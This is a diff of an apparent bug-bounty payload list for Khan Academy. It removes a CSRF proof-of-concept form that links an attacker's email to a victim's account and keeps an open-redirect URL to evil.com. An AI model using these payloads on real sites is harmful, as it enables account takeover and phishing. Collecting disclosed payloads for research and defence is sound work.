@@ -1,6 +1,6 @@
 # Khan Academy
 
-11 payloads.
+10 payloads.
 
 ### `96ef5d47`
 
@@ -43,23 +43,6 @@ https://target.com/login?continue=http:/evil.com
 ```
 
 — [Persistent class XSS \[the fuck\]](https://hackerone.com/reports/6412) · Khan Academy · [smiegles](https://hackerone.com/smiegles)
-
-### `46dc536c`
-
-```
-<html>
-  <body>
-    <form action="https://target.com/settings/linkemail" method="POST">
-      <input type="hidden" name="fkey" value="CSRF_token" />
-      <input type="hidden" name="email" value="[attacker-email-address]" />
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
-```
-
-**Parameter:** `email`
-— [CSRF token fixation and potential account takeover](https://hackerone.com/reports/308394) · Khan Academy · [co0nan](https://hackerone.com/co0nan)
 
 ### `0a7eec4d`
 
